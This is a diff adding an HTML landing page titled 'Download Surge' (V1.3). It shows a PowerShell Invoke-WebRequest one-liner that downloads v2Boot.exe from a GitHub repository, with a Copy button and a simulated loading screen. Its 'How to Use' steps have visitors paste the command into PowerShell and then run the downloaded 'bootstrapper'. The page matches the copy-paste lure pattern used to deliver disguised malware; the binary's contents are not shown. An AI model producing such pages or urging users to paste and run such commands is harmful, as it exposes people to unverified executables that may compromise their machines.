@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Surge</title>
+    <style>
+        /* Basic resets and global styles */
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #111; /* Dark background */
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            transition: opacity 1s ease-in-out;
+        }
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: rgba(18, 18, 18, 0.9); /* Dark semi-transparent background */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+        .loading-circle {
+            border: 8px solid rgba(255, 255, 255, 0.1);
+            border-top: 8px solid #ff4c4c;
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+            animation: spin 1.5s linear infinite;
+        }
+        .loading-text {
+            margin-top: 20px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+            animation: fadeIn 1s ease;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .container {
+            opacity: 0;
+            transition: opacity 1s ease-in-out;
+            width: 90vw;
+            max-width: 1000px; /* Increased max-width for larger content */
+            text-align: center;
+        }
+        .header {
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            font-size: 36px;
+            color: #ff4c4c; /* Light red */
+            margin: 0;
+            animation: slideIn 0.7s ease-out;
+        }
+        .header p {
+            font-size: 18px;
+            color: #ff4c4c;
+            margin: 0;
+            animation: slideIn 0.7s ease-out 0.3s;
+        }
+        .panel {
+            background: linear-gradient(145deg, #1f1f1f, #2e2e2e); /* Dark gradient */
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start; /* Align items to the start */
+            animation: fadeIn 1s ease-in-out 1s;
+            transition: transform 0.3s ease;
+            max-width: 100%; /* Ensure it adapts to content */
+            overflow: hidden; /* Hide overflow if content is too large */
+            margin-bottom: 20px; /* Space below the panel */
+        }
+        .panel:hover {
+            transform: scale(1.03);
+        }
+        .textbox {
+            background: #333;
+            color: #fff;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            flex: 1; /* Allow textbox to grow and fill available space */
+            height: 40px;
+            overflow: hidden;
+            text-align: left;
+            font-family: monospace;
+            resize: none;
+            transition: background 0.3s ease;
+            box-sizing: border-box; /* Include padding in width calculation */
+            white-space: nowrap; /* Prevent text wrapping */
+            overflow: hidden; /* Hide scrollbars */
+        }
+        .textbox:hover {
+            background: #444;
+        }
+        .copy-btn {
+            background: #ff4c4c;
+            color: #fff;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            opacity: 0;
+            transition: opacity 0.3s ease, background 0.3s ease;
+            height: 40px; /* Match height of the textbox */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-left: 20px; /* Space between textbox and button */
+        }
+        .panel:hover .copy-btn {
+            opacity: 1;
+        }
+        .copy-btn:active {
+            background: #e03e3e;
+        }
+        .tutorial {
+            background: linear-gradient(145deg, #1e1e1e, #2d2d2d); /* Dark gradient for tutorial section */
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            text-align: left;
+            animation: fadeIn 1s ease-in-out;
+        }
+        .tutorial h2 {
+            font-size: 24px;
+            color: #ff4c4c;
+            margin-top: 0;
+        }
+        .tutorial ol {
+            font-size: 16px;
+            color: #ddd;
+            margin: 0;
+            padding: 0;
+            list-style: none;
+        }
+        .tutorial ol li {
+            margin-bottom: 10px;
+        }
+        @keyframes slideIn {
+            from { transform: translateY(-30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loading-overlay">
+        <div>
+            <div class="loading-circle"></div>
+            <div class="loading-text">Loading...</div>
+        </div>
+    </div>
+    <div class="container">
+        <div class="header">
+            <h1>Download Here</h1>
+            <p>V1.3</p>
+        </div>
+        <div class="panel">
+            <textarea class="textbox" readonly>
+Invoke-WebRequest -Uri "https://github.com/scriptsurgee/v2Boot/raw/main/v2Boot.exe" -OutFile "$env:USERPROFILE\Downloads\v2Boot.exe" -ErrorAction Stop | Out-Null
+            </textarea>
+            <button class="copy-btn" onclick="copyText()">Copy</button>
+        </div>
+        <div class="tutorial">
+            <h2>How to Use</h2>
+            <ol>
+                <li>Copy the script above.</li>
+                <li>Open PowerShell (Non-Admin).</li>
+                <li>Paste the script.</li>
+                <li>Wait until it's finished, then run the bootstrapper in File Explorer.</li>
+            </ol>
+        </div>
+    </div>
+    <script>
+        function copyText() {
+            const textbox = document.querySelector('.textbox');
+            textbox.select();
+            document.execCommand('copy');
+            alert('Text copied to clipboard!');
+        }
+
+        // Simulate loading process
+        setTimeout(() => {
+            document.getElementById('loading-overlay').style.opacity = '0';
+            document.getElementById('loading-overlay').style.visibility = 'hidden';
+            document.querySelector('.container').style.opacity = '1';
+        }, 2000); // Simulated loading time (2 seconds)
+    </script>
+</body>
+</html>
